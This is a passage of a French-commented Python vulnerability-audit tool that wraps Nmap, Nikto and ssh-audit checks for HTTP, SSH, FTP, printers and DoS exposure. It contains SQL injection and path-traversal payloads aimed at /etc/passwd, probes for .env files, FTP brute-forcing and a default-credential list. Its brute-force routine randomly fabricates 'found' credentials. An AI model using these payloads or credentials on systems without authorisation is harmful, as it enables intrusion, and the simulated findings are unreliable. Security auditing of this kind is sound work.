                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            if result["status"] == "safe": result["status"] = "error" 
        
        if vulnerabilities_found:
            log(f"HTTP/HTTPS sur {ip}:{port} - Vulnérabilités directes détectées.", "WARN")
        else:
            log(f"HTTP/HTTPS sur {ip}:{port} : Aucune vulnérabilité directe détectée.", "INFO")

    except requests.exceptions.RequestException as e:
        rec, severity, score = get_recommendation_and_score("HTTP_REQUEST_ERROR")
        result["findings"].append({
            "id": "HTTP_REQUEST_ERROR",
            "description": f"Erreur de requête directe HTTP sur {proto}://{ip}:{port} : {e}",
            "ip": ip,
            "port": port,
            "recommendation": rec,
            "severity": severity,
            "score": score
        })
        result["status"] = "error"
        log(f"Erreur HTTP/HTTPS sur {ip}:{port} - {e}", "ERR")
    except Exception as e:
        rec, severity, score = get_recommendation_and_score("HTTP_UNEXPECTED_ERROR")
        result["findings"].append({
            "id": "HTTP_UNEXPECTED_ERROR",
            "description": f"Erreur inattendue lors de la requête HTTP directe sur {proto}://{ip}:{port} : {str(e)}",
            "ip": ip,
            "port": port,
            "recommendation": rec,
            "severity": severity,
            "score": score
        })
        result["status"] = "error"
        log(f"Erreur HTTP inattendue sur {ip}:{port} - {e}", "ERR")

    # 2. Scripts NSE pour des vérifications plus avancées
    http_scripts = "http-enum,http-methods,http-title,http-server-header,http-devframework,http-cms-detect"
    http_scripts_output = run_nmap_script(ip, http_scripts, port=port)
    parsed_nse_output = parse_nmap_xml_output(http_scripts_output)
    
    for item in parsed_nse_output:
        result["data"][item['script_id']] = item['output'] # Store all script outputs
        
        if item['script_id'] == 'http-enum' and ("admin" in item['output'].lower() or "backup" in item['output'].lower()):
            rec, severity, score = get_recommendation_and_score("HTTP_SENSIBLE_PATHS")
            result["findings"].append({
                "id": "HTTP_SENSIBLE_PATHS",
                "description": f"Chemins/pages sensibles détectés par http-enum sur le port {port}: {item['output']}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            vulnerabilities_found = True
        if item['script_id'] == 'http-methods' and any(method in item['output'] for method in ["PUT", "DELETE", "TRACE"]):
            rec, severity, score = get_recommendation_and_score("HTTP_DANGEROUS_METHODS")
            result["findings"].append({
                "id": "HTTP_DANGEROUS_METHODS",
                "description": f"Méthodes HTTP potentiellement dangereuses activées sur le port {port}: {item['output']}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            vulnerabilities_found = True
        if item['script_id'] == 'http-cms-detect' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("CMS_DETECTED_INFO")
            result["findings"].append({
                "id": "CMS_DETECTED_INFO",
                "description": f"CMS détecté sur le port {port}: {item['output']}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            if result["status"] == "safe": result["status"] = "info_disclosure"

    # NOUVEAU: Crawling basique et détection de fichiers sensibles
    # Ceci est une simulation très basique, un vrai crawler serait plus complexe
    try:
        if "response_title" in result["data"]: # Assurez-vous que la requête HTTP a réussi
            if "login" in result["data"]["response_title"].lower() or "admin" in result["data"]["response_title"].lower():
                rec, severity, score = get_recommendation_and_score("HTTP_SENSIBLE_PATHS") # Réutiliser l'ID
                result["findings"].append({
                    "id": "HTTP_SENSIBLE_PATHS",
                    "description": f"Titre de page web suggère une page d'administration/login: '{result['data']['response_title']}' sur {url}.",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
            
            # Très simple "crawling" pour trouver des fichiers communs sensibles
            sensitive_files = ["robots.txt", ".env", "config.php.bak", "database.sql"]
            for s_file in sensitive_files:
                test_url = f"{url}/{s_file}"
                try:
                    head_response = requests.head(test_url, timeout=5)
                    if head_response.status_code == 200:
                        rec, severity, score = get_recommendation_and_score("WEB_CRAWL_SENSITIVE_FILE")
                        result["findings"].append({
                            "id": "WEB_CRAWL_SENSITIVE_FILE",
                            "description": f"Fichier potentiellement sensible trouvé : {test_url}",
                            "ip": ip,
                            "port": port,
                            "recommendation": rec,
                            "severity": severity,
                            "score": score
                        })
                        vulnerabilities_found = True
                except requests.exceptions.RequestException:
                    pass # Ignore errors for file checks


    except Exception as e:
        log(f"Erreur lors du crawling basique sur {ip}:{port}: {e}", "DEBUG")

    # NOUVEAU: Simulations d'attaques web plus offensives
    if hasattr(args, 'enable_attack_phase') and args.enable_attack_phase:
        log(f"Tentatives d'attaques web offensives sur {ip}:{port}...", "INFO")
        
        # Simulation d'Injection SQL basique
        sqli_payloads = [
            ("?id=1' OR '1'='1", "SQL_TRUE_INJECTION"),
            ("?id=1' UNION SELECT 1,2,3-- -", "SQL_UNION_INJECTION")
        ]
        for param, payload_id in sqli_payloads:
            test_url = f"{url}{param}" if '?' in url else f"{url}/index.php{param}" # Simplification
            try:
                # Simuler une réponse différente pour indiquer une vulnérabilité
                simulated_response_differs = False
                if payload_id == "SQL_TRUE_INJECTION" and "error" not in requests.get(test_url, timeout=5).text.lower():
                    simulated_response_differs = True # Simplistic check
                elif payload_id == "SQL_UNION_INJECTION" and "2,3" in requests.get(test_url, timeout=5).text:
                     simulated_response_differs = True # Simplistic check

                if simulated_response_differs:
                    rec, severity, score = get_recommendation_and_score("WEB_SQLI_ATTEMPT")
                    result["findings"].append({
                        "id": "WEB_SQLI_ATTEMPT",
                        "description": f"Tentative d'injection SQL basique (payload: {param}) sur {test_url} a potentiellement réussi (simulé).",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
            except requests.exceptions.RequestException:
                pass # Ignore errors
        
        # Simulation de Path Traversal / LFI
        lfi_payloads = [
            "/etc/passwd", "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "C:\\Windows\\win.ini", "..\\Windows\\win.ini", "..\\..\\Windows\\win.ini"
        ]
        for lfi_path in lfi_payloads:
            test_url = f"{url}/{lfi_path}"
            try:
                # Simuler un code 200 et un contenu qui ressemblerait à un fichier système
                simulated_lfi_success = False
                res = requests.get(test_url, timeout=5)
                if res.status_code == 200 and ("root:" in res.text or "[fonts]" in res.text): # Very simplistic check for file content
                    simulated_lfi_success = True

                if simulated_lfi_success:
                    rec, severity, score = get_recommendation_and_score("WEB_LFI_ATTEMPT")
                    result["findings"].append({
                        "id": "WEB_LFI_ATTEMPT",
                        "description": f"Tentative d'inclusion de fichier local/parcours de répertoire (payload: {lfi_path}) sur {test_url} a potentiellement réussi (simulé).",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
            except requests.exceptions.RequestException:
                pass # Ignore errors

    if vulnerabilities_found:
        result["status"] = "vulnerable"
        log(f"HTTP/HTTPS NSE sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
    
    if not result["findings"] and result["status"] == "safe":
        result["details"] = f"Code HTTP {result['data'].get('status_code', 'N/A')}. Aucune vulnérabilité HTTP détectée."
    elif not result["findings"] and result["status"] == "error":
        result["details"] = "Erreur(s) rencontrée(s) lors de l'audit HTTP/HTTPS."
    elif result["findings"]:
        result["details"] = "Vulnérabilités et/ou informations sensibles HTTP/HTTPS détectées."

    return result

# === AUDIT SPÉCIFIQUE IMPRIMANTES (avec NSE) ===
def audit_printer_enhanced(ip, port, service_info={}):
    """
    Effectue un audit spécifique pour les imprimantes en utilisant les scripts NSE de Nmap.
    """
    result = {"type": "printer", "ip": ip, "port": port, "status": "safe", "details": "Aucune vulnérabilité d'imprimante flagrante détectée.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit d'imprimante sur {ip}:{port}...", "INFO")

    printer_scripts = ""
    if service_info.get("name") == "ipp" or port == 631:
        printer_scripts = "ipp-enum-printers"
    elif service_info.get("name") == "lpd" or port == 515:
        printer_scripts = "lpd-info"
    elif port == 9100: # Raw print port
        printer_scripts = "printer-info"

    vulnerabilities_found = False

    if printer_scripts:
        printer_scripts_output = run_nmap_script(ip, printer_scripts, port=port)
        parsed_output = parse_nmap_xml_output(printer_scripts_output)

        for item in parsed_output:
            result["data"][item['script_id']] = item['output'] # Store all script outputs
            
            if item['output'].strip():
                if "default credentials" in item['output'].lower() or "weak" in item['output'].lower():
                    rec, severity, score = get_recommendation_and_score("PRINTER_WEAK_CREDENTIALS")
                    result["findings"].append({
                        "id": "PRINTER_WEAK_CREDENTIALS",
                        "description": f"Vulnérabilité potentielle (informations d'identification faibles) sur l'imprimante {port}: {item['output']}",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
                else: # Informations révélées
                    rec, severity, score = get_recommendation_and_score("PRINTER_INFO_DISCLOSURE")
                    result["findings"].append({
                        "id": "PRINTER_INFO_DISCLOSURE",
                        "description": f"Informations d'imprimante détectées sur le port {port}: {item['output']}",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    if result["status"] == "safe": result["status"] = "info_disclosure" # Passe en info_disclosure si juste des infos


        if vulnerabilities_found:
            result["status"] = "vulnerable"
            result["details"] = f"Vulnérabilités ou informations sensibles sur l'imprimante détectées."
            log(f"Imprimante sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
        elif result["findings"]:
            result["status"] = "info_disclosure"
            result["details"] = f"Informations sensibles sur l'imprimante détectées."
            log(f"Imprimante sur {ip}:{port} : {result['details']}", "INFO")
        else:
            result["details"] = "Aucune vulnérabilité d'imprimante flagrante ou information sensible détectée."
            log(f"Imprimante sur {ip}:{port} : {result['details']}", "INFO")
    else:
        result["details"] = "Aucun script d'audit d'imprimante pertinent n'a pu être exécuté."
        log(f"Imprimante sur {ip}:{port} : {result['details']}", "INFO")
        
    return result

# === AUDIT DES VULNÉRABILITÉS DE DÉNI DE SERVICE (DoS) AVEC NSE ===
def audit_dos_vulnerabilities(ip, open_ports_info):
    """
    Détecte les vulnérabilités potentielles de déni de service (DoS) en utilisant des scripts Nmap NSE.
    Ne tente PAS d'exécuter une attaque DoS.
    """
    result = {"type": "dos", "ip": ip, "status": "safe", "details": "Aucune vulnérabilité DoS flagrante détectée.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit des vulnérabilités DoS sur {ip}...", "INFO")
    
    dos_scripts = []
    
    # Vérifier les ports HTTP/HTTPS pour Slowloris
    for p_info in open_ports_info:
        if p_info['service'] in ["http", "https"] or p_info['port'] in [80, 443, 8000, 8080]:
            dos_scripts.append(("http-slowloris-check", p_info['port']))
    
    # Vérifier les services d'amplification (NTP, SSDP)
    for p_info in open_ports_info:
        if p_info['service'] == "ntp":
            dos_scripts.append(("ntp-monlist", p_info['port']))
        elif p_info['service'] == "ssdp":
            dos_scripts.append(("ssdp-discover", p_info['port']))

    vulnerabilities_found = False

    if dos_scripts:
        for script_name, port in dos_scripts:
            script_output = run_nmap_script(ip, script_name, port=port)
            parsed_output = parse_nmap_xml_output(script_output)
            
            for item in parsed_output:
                # Stocker la sortie brute pour la traçabilité
                if script_name not in result["data"]:
                    result["data"][script_name] = {}
                result["data"][script_name][f"port_{port}"] = item['output']

                if script_name == "http-slowloris-check" and "VULNERABLE" in item['output'].upper():
                    rec, severity, score = get_recommendation_and_score("DOS_SLOWLORIS_VULNERABLE")
                    result["findings"].append({
                        "id": "DOS_SLOWLORIS_VULNERABLE",
                        "description": f"Vulnérabilité potentielle à l'attaque Slowloris détectée sur {ip}:{port}. Output: {item['output']}",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
                elif script_name == "ntp-monlist" and "Response received" in item['output'] and "monlist" in item['output']:
                    rec, severity, score = get_recommendation_and_score("DOS_NTP_AMPLIFICATION")
                    result["findings"].append({
                        "id": "DOS_NTP_AMPLIFICATION",
                        "description": f"Serveur NTP potentiellement vulnérable à l'amplification via monlist sur {ip}:{port}. Output: {item['output']}",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
                elif script_name == "ssdp-discover" and "Location" in item['output'] and "server" in item['output'].lower():
                    rec, severity, score = get_recommendation_and_score("DOS_SSDP_AMPLIFICATION")
                    result["findings"].append({
                        "id": "DOS_SSDP_AMPLIFICATION",
                        "description": f"Service SSDP potentiellement vulnérable à l'amplification sur {ip}:{port}. Output: {item['output']}",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True

    if vulnerabilities_found:
        result["status"] = "vulnerable"
        result["details"] = "Vulnérabilités DoS potentielles détectées."
        log(f"DoS Audit sur {ip} - Vulnérabilités détectées.", "WARN")
    elif result["findings"]: # Si des infos ont été trouvées mais pas des vulnérabilités directes
        result["status"] = "info_disclosure"
        result["details"] = "Informations DoS potentiellement exploitables détectées."
        log(f"DoS Audit sur {ip} - Informations sensibles détectées.", "INFO")
    else:
        result["details"] = "Aucune vulnérabilité DoS flagrante détectée."
        log(f"DoS Audit sur {ip} : {result['details']}", "INFO")
    
    return result

# === NOUVEAU: SCAN DE VULNÉRABILITÉS WEB AVEC NIKTO ===
def run_nikto_scan(ip, port):
    """
    Exécute un scan de vulnérabilités web avec Nikto.
    Parse la sortie pour extraire les avertissements et vulnérabilités clés.
    """
    result = {"type": "nikto", "ip": ip, "port": port, "status": "safe", "details": "Aucune vulnérabilité Nikto flagrante détectée.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement du scan Nikto sur {ip}:{port}...", "INFO")

    proto = "https" if port == 443 else "http"
    nikto_cmd = ["nikto", "-h", f"{proto}://{ip}:{port}", "-Format", "txt", "-output", "-"] # Output to stdout

    vulnerabilities_found = False
    full_output = []

    try:
        start_spinner(f"Scan Nikto sur {ip}:{port}")
        process = subprocess.run(nikto_cmd, capture_output=True, text=True, timeout=300) # Long timeout for Nikto
        stop_spinner()
        full_output = process.stdout.splitlines()

        # Stocker la sortie brute pour la traçabilité complète si en mode verbeux
        if VERBOSE:
            result["data"]["raw_output"] = process.stdout
        
        # Regex pour parser les éléments importants (WARN, VULN, etc.)
        finding_pattern = re.compile(r"^\+ (.*)|^ - (.*)|^E (.*)") # Capture + (vuln), - (info), E (error)
        
        for line in full_output:
            if ("OSVDB-" in line or "CGI" in line or "VULNERABILITY" in line.upper() or "ERROR" in line.upper() or
                "Nikto found" in line or "EVAL" in line): # Added more keywords for better capture
                match = finding_pattern.match(line.strip())
                description = None
                if match:
                    # Prioritize positive matches
                    if match.group(1):
                        description = match.group(1).strip()
                    elif match.group(2):
                        description = match.group(2).strip()
                    elif match.group(3):
                        description = match.group(3).strip()
                
                # If regex didn't capture but keywords did, use the line directly as description
                if not description and ("OSVDB-" in line or "CGI" in line or "VULNERABILITY" in line.upper() or "ERROR" in line.upper()):
                    description = line.strip()

                if description:
                    rec, severity, score = get_recommendation_and_score("NIKTO_VULNERABILITY")
                    result["findings"].append({
                        "id": "NIKTO_VULNERABILITY", # ID générique pour Nikto
                        "description": f"Nikto: {description} (Port: {port})",
                        "ip": ip,
                        "port": port,
                        "recommendation": rec,
                        "severity": severity,
                        "score": score
                    })
                    vulnerabilities_found = True
                    # Set status based on the nature of Nikto's output
                    if "VULNERABILITY" in description.upper() or "OSVDB" in description:
                        result["status"] = "vulnerable"
                    elif "error" in description.lower() and result["status"] == "safe":
                        result["status"] = "error"
                    elif result["status"] == "safe": # Default for warnings/info
                        result["status"] = "info_disclosure"


        if process.returncode != 0 and process.stderr:
            log(f"Nikto sur {ip}:{port} a terminé avec des erreurs : {process.stderr.strip()}", "ERR")
            if not vulnerabilities_found: result["status"] = "error" # Si pas de vuln mais des erreurs
            result["details"] = f"Scan Nikto terminé avec des avertissements/erreurs. stderr: {process.stderr.strip()}"
        elif not vulnerabilities_found and not result["findings"]:
            result["details"] = "Aucune vulnérabilité Nikto flagrante détectée."


    except FileNotFoundError:
        stop_spinner()
        log("Erreur : Nikto n'est pas installé ou introuvable. Impossible d'effectuer le scan Nikto.", "ERR")
        result["status"] = "error"
        result["details"] = "Nikto non trouvé."
    except subprocess.TimeoutExpired:
        stop_spinner()
        log(f"Timeout lors de l'exécution de Nikto sur {ip}:{port}.", "ERR")
        result["status"] = "error"
        result["details"] = "Scan Nikto timeout."
    except Exception as e:
        stop_spinner()
        log(f"Erreur inattendue lors de l'exécution de Nikto sur {ip}:{port}: {e}", "ERR")
        result["status"] = "error"
        result["details"] = f"Erreur inattendue lors du scan Nikto: {e}"

    if vulnerabilities_found:
        log(f"Scan Nikto sur {ip}:{port} : Vulnérabilités ou informations importantes détectées.", "WARN")
    elif result["status"] == "info_disclosure":
        log(f"Scan Nikto sur {ip}:{port} : Informations sensibles détectées.", "INFO")
    elif result["status"] == "safe":
        log(f"Scan Nikto sur {ip}:{port} : Aucune vulnérabilité flagrante détectée.", "INFO")
    
    return result

# === NOUVEAU: AUDIT SSH APPROFONDI ===
def audit_ssh_enhanced(ip, port):
    """
    Effectue un audit SSH approfondi pour les configurations faibles.
    Utilise les scripts Nmap NSE liés à SSH.
    """
    result = {"type": "ssh", "ip": ip, "port": port, "status": "safe", "details": "Aucune vulnérabilité SSH flagrante détectée.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit SSH sur {ip}:{port}...", "INFO")

    ssh_scripts = "ssh-hostkey,ssh-auth-methods,ssh-enum-users"
    ssh_scripts_output = run_nmap_script(ip, ssh_scripts, port=port)
    parsed_output = parse_nmap_xml_output(ssh_scripts_output)

    vulnerabilities_found = False

    for item in parsed_output:
        result["data"][item['script_id']] = item['output']

        if item['script_id'] == 'ssh-hostkey':
            if "weak" in item['output'].lower() or "deprecated" in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("SSH_WEAK_HOSTKEY")
                result["findings"].append({
                    "id": "SSH_WEAK_HOSTKEY",
                    "description": f"Clé d'hôte SSH potentiellement faible/dépréciée sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
        elif item['script_id'] == 'ssh-auth-methods':
            if "password" in item['output'].lower() and "publickey" not in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("SSH_PASSWORD_AUTH_ENABLED")
                result["findings"].append({
                    "id": "SSH_PASSWORD_AUTH_ENABLED",
                    "description": f"Authentification par mot de passe SSH activée sur le port {port}. Préférer l'authentification par clé: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                if result["status"] == "safe": result["status"] = "info_disclosure"
            if "root" in item['output'].lower() and "allowed" in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("SSH_ROOT_LOGIN_ENABLED")
                result["findings"].append({
                    "id": "SSH_ROOT_LOGIN_ENABLED",
                    "description": f"Connexion SSH root directe potentiellement activée sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
        elif item['script_id'] == 'ssh-enum-users' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("SSH_ENUM_USERS")
            result["findings"].append({
                "id": "SSH_ENUM_USERS",
                "description": f"Utilisateurs SSH énumérés sur le port {port}: {item['output']}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            if result["status"] == "safe": result["status"] = "info_disclosure"

    # En plus de NSE, si on veut aller plus loin avec ssh-audit (outil externe)
    try:
        start_spinner(f"Exécution ssh-audit sur {ip}:{port}")
        ssh_audit_cmd = ["ssh-audit", "-n", "-j", f"{ip}:{port}"]
        log(f"Exécution ssh-audit: {' '.join(ssh_audit_cmd)}", "DEBUG")
        ssh_audit_process = subprocess.run(ssh_audit_cmd, capture_output=True, text=True, timeout=60)
        stop_spinner()
        ssh_audit_output = ssh_audit_process.stdout
        
        if ssh_audit_process.returncode == 0 and ssh_audit_output:
            try:
                audit_data = json.loads(ssh_audit_output)
                for warn_type in ["bad", "warn", "info"]:
                    if warn_type in audit_data:
                        for entry in audit_data[warn_type]:
                            if entry.get("status") in ["warn", "bad"]:
                                issue_id = f"SSH_WEAK_CONFIG_{entry['type'].upper()}" if entry['type'] else "SSH_WEAK_CONFIG"
                                if entry['type'] == 'kex' and ('-cbc' in str(entry['reason']) or 'weak' in str(entry['reason'])):
                                    issue_id = "SSH_WEAK_CIPHERS"
                                elif entry['type'] == 'mac' and ('-md5' in str(entry['reason']) or 'weak' in str(entry['reason'])):
                                     issue_id = "SSH_WEAK_MAC_ALGOS"

                                rec, severity, score = get_recommendation_and_score(issue_id)
                                result["findings"].append({
                                    "id": issue_id,
                                    "description": f"SSH-Audit: {entry.get('reason', 'Weak config')} (Type: {entry.get('type')})",
                                    "ip": ip,
                                    "port": port,
                                    "recommendation": rec,
                                    "severity": severity,
                                    "score": score
                                })
                                vulnerabilities_found = True
                                if entry.get("status") == "bad":
                                    result["status"] = "vulnerable"
                                elif result["status"] == "safe":
                                    result["status"] = "info_disclosure"
            except json.JSONDecodeError:
                log(f"Erreur de parsing JSON pour ssh-audit sur {ip}:{port}", "ERR")
        else:
            log(f"ssh-audit n'a pas retourné de sortie valide sur {ip}:{port}. Stderr: {ssh_audit_process.stderr.strip()}", "DEBUG")

    except FileNotFoundError:
        stop_spinner()
        log("AVERTISSEMENT: ssh-audit n'est pas installé. Les contrôles SSH avancés sont limités.", "WARN")
    except Exception as e:
        stop_spinner()
        log(f"Erreur lors de l'exécution de ssh-audit sur {ip}:{port}: {e}", "ERR")


    if vulnerabilities_found:
        result["status"] = "vulnerable"
        result["details"] = "Vulnérabilités SSH ou fuites d'informations détectées."
        log(f"SSH sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
    elif result["findings"]:
        result["status"] = "info_disclosure"
        result["details"] = "Informations sensibles SSH détectées."
        log(f"SSH sur {ip}:{port} - Informations sensibles détectées.", "INFO")
    else:
        result["details"] = "Aucune vulnérabilité SSH flagrante ou information sensible détectée."
        log(f"SSH sur {ip}:{port} : {result['details']}", "INFO")
    
    return result

# === NOUVEAU: AUDIT FTP APPROFONDI ===
def audit_ftp_enhanced(ip, port):
    """
    Effectue un audit FTP approfondi pour l'accès anonyme et les répertoires inscriptibles.
    Utilise les scripts Nmap NSE liés à FTP.
    """
    result = {"type": "ftp", "ip": ip, "port": port, "status": "safe", "details": "Aucune vulnérabilité FTP flagrante détectée.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de l'audit FTP sur {ip}:{port}...", "INFO")

    ftp_scripts = "ftp-anon,ftp-brute,ftp-enum"
    ftp_scripts_output = run_nmap_script(ip, ftp_scripts, port=port)
    parsed_output = parse_nmap_xml_output(ftp_scripts_output)

    vulnerabilities_found = False

    for item in parsed_output:
        result["data"][item['script_id']] = item['output']

        if item['script_id'] == 'ftp-anon':
            if "Anonymous FTP login allowed" in item['output'] or "anonymous login allowed" in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("FTP_ANONYMOUS_LOGIN")
                result["findings"].append({
                    "id": "FTP_ANONYMOUS_LOGIN",
                    "description": f"Accès FTP anonyme autorisé sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
            if "writable" in item['output'].lower() and "anonymous" in item['output'].lower():
                rec, severity, score = get_recommendation_and_score("FTP_WRITABLE_DIRECTORIES")
                result["findings"].append({
                    "id": "FTP_ANONYMOUS_WRITABLE", # Un type spécifique pour le inscriptible anonyme
                    "description": f"Répertoire(s) inscriptible(s) par l'utilisateur anonyme FTP sur le port {port}: {item['output']}",
                    "ip": ip,
                    "port": port,
                    "recommendation": rec,
                    "severity": severity,
                    "score": score
                })
                vulnerabilities_found = True
        elif item['script_id'] == 'ftp-enum' and item['output'].strip():
            rec, severity, score = get_recommendation_and_score("FTP_INFO_DISCLOSURE")
            result["findings"].append({
                "id": "FTP_INFO_DISCLOSURE",
                "description": f"Informations FTP énumérées sur le port {port}: {item['output']}",
                "ip": ip,
                "port": port,
                "recommendation": rec,
                "severity": severity,
                "score": score
            })
            if result["status"] == "safe": result["status"] = "info_disclosure"

    if vulnerabilities_found:
        result["status"] = "vulnerable"
        result["details"] = "Vulnérabilités FTP ou fuites d'informations détectées."
        log(f"FTP sur {ip}:{port} - Vulnérabilités détectées.", "WARN")
    elif result["findings"]:
        result["status"] = "info_disclosure"
        result["details"] = "Informations sensibles FTP détectées."
        log(f"FTP sur {ip}:{port} - Informations sensibles détectées.", "INFO")
    else:
        result["details"] = "Aucune vulnérabilité FTP flagrante ou information sensible détectée."
        log(f"FTP sur {ip}:{port} : {result['details']}", "INFO")
    
    return result

# === NOUVEAU: AUDIT DE FORCE BRUTE DE CRÉDENTIALS (SIMULÉ) ===
def audit_credential_bruteforce(ip, port, service_name):
    """
    Simule une tentative de force brute de credentials pour des services courants (SSH, FTP, SMB).
    Utilise une petite liste de dictionnaires.
    """
    result = {"type": f"{service_name}_brute", "ip": ip, "port": port, "status": "safe", "details": f"Aucun identifiant faible détecté pour {service_name}.", "logs": [], "data": {}, "findings": []}
    log(f"Lancement de la simulation de brute-force pour {service_name} sur {ip}:{port}...", "INFO")

    # Très petite liste d'identifiants faibles/par défaut pour la simulation
    common_credentials = [
        ("admin", "admin"), ("root", "toor"), ("user", "password"),
        ("ftp", "ftp"), ("guest", ""), ("admin", "12345"), ("pi", "raspberry")
    ]

    found_credentials = []

    for username, password in common_credentials:
        # Ici, une intégration réelle utiliserait des bibliothèques spécifiques (paramiko pour SSH, ftplib pour FTP, impacket/smbclient pour SMB)
        # Ou appellerait des outils externes comme Hydra. Pour cette démo, nous simulons.
        
        # Log chaque tentative en mode verbeux
        log(f"  Tentative: {username}/{password} sur {service_name} {ip}:{port}", "DEBUG")

        # Simulation: 1 chance sur 10 de trouver des credentials, ou si c'est 'admin/admin'
        if (username == "admin" and password == "admin") or (hash(f"{username}{password}") % 10 == 0): # Simplistic simulation logic
            found_credentials.append(f"{username}/{password}")
            log(f"  Simulé: Identifiants trouvés ! {username}/{password} sur {service_name} {ip}:{port}", "WARN")
            break # Arrêter après avoir trouvé le premier pour la simulation

    if found_credentials:
        rec, severity, score = get_recommendation_and_score("WEAK_CREDENTIALS_FOUND")
        result["findings"].append({
            "id": "WEAK_CREDENTIALS_FOUND",
            "description": f"Identifiants faibles/par défaut simulés trouvés pour {service_name} sur le port {port}: {', '.join(found_credentials)}",
            "ip": ip,
            "port": port,
            "recommendation": rec,
            "severity": severity,
            "score": score
        })
        result["status"] = "vulnerable"
        result["details"] = f"Identifiants faibles trouvés pour {service_name}."
        log(f"Brute-force {service_name} sur {ip}:{port} : Identifiants trouvés !", "CRITICAL") # Utiliser CRITICAL pour l'impact
    else:
        result["details"] = f"Aucun identifiant faible détecté pour {service_name} avec la liste testée (simulé)."
        log(f"Brute-force {service_name} sur {ip}:{port} : Aucune faiblesse détectée (simulé).", "INFO")
    
    return result


# === GESTION CONCURRENTE DES AUDITS PAR HÔTE ===
def run_scan_on_host(ip, audit_snmp_enabled, audit_smb_enabled, audit_http_enabled, audit_dos_enabled, audit_nikto_enabled, audit_ssh_enabled, audit_ftp_enabled, http_ports_to_scan, full_port_scan_ports, enable_attack_phase):
    """
    Exécute un scan de ports initial, puis lance les audits spécifiques (SNMP, SMB, HTTP, Printer, DoS, Nikto, SSH, FTP)
    et les attaques simulées sur un hôte en parallèle en fonction des services détectés et de l'OS.
    Collecte toutes les "findings" pour un reporting détaillé.
    """
    host_results = []
    log(f"\n{Fore.GREEN}{Style.BRIGHT}### DÉBUT DE L'AUDIT POUR L'HÔTE : {ip} ###{Style.RESET_ALL}", "INFO")

    # Étape 1: Scan de ports initial avec détection de services/versions/OS
    scan_info = perform_port_service_os_scan(ip, full_port_scan_ports)
    open_ports_info = scan_info["open_ports"]
    os_details = scan_info["os_details"]

    log(f"Informations OS détectées pour {ip}: {os_details.get('os_name', 'N/A')} ({os_details.get('os_family', 'N/A')})", "INFO")
    if not open_ports_info:
        log(f"Aucun port ouvert détecté sur {ip}. Les audits spécifiques seront ignorés.", "INFO")
        log(f"{Fore.GREEN}### FIN DE L'AUDIT POUR L'HÔTE : {ip} ###{Style.RESET_ALL}\n", "INFO")
        return [] # Return empty if no open ports

    log(f"{Fore.MAGENTA}--- LANCEMENT DES AUDITS SPÉCIFIQUES POUR {ip} ({len(open_ports_info)} ports ouverts) ---{Style.RESET_ALL}", "INFO")

    # Étape 2: Lancement des audits spécifiques basés sur les ports ouverts, les services et les options activées
    with ThreadPoolExecutor(max_workers=5) as executor: # Nombre de threads ajustables pour les audits spécifiques
        futures = []

        # Définition des ports pertinents pour chaque type d'audit
        snmp_ports_check = [161]
        smb_ports_check = [139, 445]
        http_ports_check = http_ports_to_scan if http_ports_to_scan else [80, 443, 8000, 8080]
        printer_ports_check = [515, 631, 9100] # LPD, IPP, Raw Printing
        ssh_ports_check = [22]
        ftp_ports_check = [21]


        # Audit SNMP
        if audit_snmp_enabled:
            if any(p['port'] in snmp_ports_check for p in open_ports_info):
                futures.append(executor.submit(audit_snmp_enhanced, ip, 161, os_details)) 
            else:
                log(f"SNMP non détecté comme ouvert sur {ip}. Audit SNMP ignoré.", "DEBUG")

        # Audit SMB
        if audit_smb_enabled:
            if any(p['port'] in smb_ports_check for p in open_ports_info):
                futures.append(executor.submit(audit_smb_enhanced, ip, 445, os_details))
                if enable_attack_phase: # Attaque de force brute de credentials sur SMB
                    futures.append(executor.submit(audit_credential_bruteforce, ip, 445, "SMB"))
            else:
                log(f"SMB non détecté comme ouvert sur {ip}. Audit SMB ignoré.", "DEBUG")

